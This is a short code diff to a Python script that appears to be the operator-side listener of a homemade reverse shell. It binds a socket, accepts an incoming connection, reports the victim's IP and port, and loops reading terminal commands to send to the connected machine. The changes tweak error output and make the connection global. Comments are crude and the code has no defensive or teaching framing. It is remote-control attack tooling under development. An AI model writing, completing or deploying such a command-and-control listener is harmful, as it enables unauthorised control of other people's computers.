@@ -25,18 +25,19 @@ def socketbid():
         s.bind((host, port))
         s.listen(5)#amount of bad connections which can be taken becuser 
     except socket.error as msg:
-        print('lol u fucked up i cba it might retry it might not\n retrying noe ')
+        print('lol u fucked up i cba it might retry it might not\n retrying noe ' + str(msg))
         socketbid()
 
 
 #make some connection via listening and stuff
 def socketaccept():
+    global conn
     conn, address = s.accept()#info here
     print('going to accept now...\nconnection established mad shit ' +'IP:' + address[0] + ', port:' + str(address[1]))
-    sendcommand(conn)#now waits for ur commands
+    sendcommand()#now waits for ur commands
     conn.close()
 
-def sendcommand(conn):
+def sendcommand():
     while True:
         cmd = input()#now takes input from our terminal
         if cmd == 'quit':#if u wanna quit type this in terminal
